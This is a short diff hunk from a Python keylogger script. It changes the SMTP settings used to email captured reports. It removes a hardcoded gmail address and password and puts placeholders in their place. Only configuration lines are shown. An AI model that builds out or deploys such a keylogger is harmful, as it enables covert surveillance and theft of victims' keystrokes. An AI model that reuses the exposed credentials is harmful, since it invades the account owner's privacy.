@@ -5,8 +5,8 @@ import smtplib  # for sending email using SMTP protocol (gmail)
 from threading import Semaphore, Timer
 
 SEND_REPORT_EVERY = 60  # 10 minutes
-EMAIL_ADDRESS = "achinuambol@gmail.com"
-EMAIL_PASSWORD = "123456789achinu"
+EMAIL_ADDRESS = "your-email@company.com"
+EMAIL_PASSWORD = "your-password"
 
 
 class Keylogger:
